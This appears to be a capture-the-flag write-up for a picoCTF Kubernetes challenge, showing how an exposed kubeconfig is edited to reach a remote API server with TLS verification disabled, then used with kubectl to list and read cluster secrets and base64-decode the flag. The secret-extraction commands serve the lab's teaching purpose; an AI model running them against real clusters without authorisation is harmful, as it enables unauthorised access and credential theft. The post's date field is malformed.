---
layout: post
title: "Pico CTF Writeup"
subtitle: ""
date: 2026-18-03 11:11:00 +0530
author: s0c41dgvns 
categories: [CTF writeups]
tags: [
  CTF writeup,
    Cloud,
    kubernetes
]
---
# KSECRETS 
![Img](/assets/images/picoctf2026/ksecrets0.jpeg)

```bash
green-hill.picoctf.net:49794 # cluster running on instance
file: http://green-hill.picoctf.net:60662/kubeconfig

hints:
1: Where are secrets usually stored in Kubernetes
2: How are Kubernetes secrets stored internally? Can you decode them?
3: Please ignore TLS
```

---

# Kubernetes Secrets Exposure – Writeup

---

# 🔍 Step 1: Initial Access

We were provided with:

- A **kubeconfig file**
- A **remote Kubernetes API endpoint**

From the challenge:

```bash
green-hill.picoctf.net:49794
```

---

# ⚠️ Step 2: Fixing kubeconfig

### Problem:

The kubeconfig initially pointed to:

```yaml
server: https://127.0.0.1:6443
```

👉 This means **localhost**, not the remote cluster.

---

### Fix applied:

```yaml
clusters:
- cluster:
    server: https://green-hill.picoctf.net:49794
    insecure-skip-tls-verify: true
```

### Key fixes:

- Updated API server endpoint ✅
- Disabled TLS verification (certificate mismatch) ✅
- Removed `certificate-authority-data` to avoid conflict ✅

---

# ⚙️ Step 3: Connect to Cluster

```bash
export KUBECONFIG=./kubeconfig.yaml
kubectl get ns
```

### Output:

```
default
kube-system
kube-public
kube-node-lease
picoctf
```

👉 Successfully gained access to the cluster.

---

# 🔎 Step 4: Enumeration

List all secrets across namespaces:

```bash
kubectl get secrets -A
```

### Output:

```
picoctf   ctf-secret   Opaque
```

👉 Found a suspicious secret in `picoctf` namespace.

---

# 🔐 Step 5: Extract Secret

```bash
kubectl get secret ctf-secret -n picoctf -o yaml
```

### Output:

```yaml
data:
  flag: cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfYzMyMWZiMTV9Cg==
```

---

# 🔓 Step 6: Decode the Flag

```bash
echo "cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfYzMyMWZiMTV9Cg==" | base64 -d
```

### 🎉 Flag:

```
picoCTF{ks3cr375_41n7_s4f3_c321fb15}
```

---

# 💣 Key Vulnerability

👉 **Exposed kubeconfig file and secrets stored on etcd file in master nodes**

This allowed:

- Direct cluster access
- Secret enumeration
- Sensitive data extraction

---

# ⚡ Attack Flow Summary

```
Kubeconfig obtained
        ↓
Modify API endpoint
        ↓
Bypass TLS verification
        ↓
Connect using kubectl
        ↓
Enumerate namespaces
        ↓
List secrets
        ↓
Extract secret
        ↓
Decode flag
```

---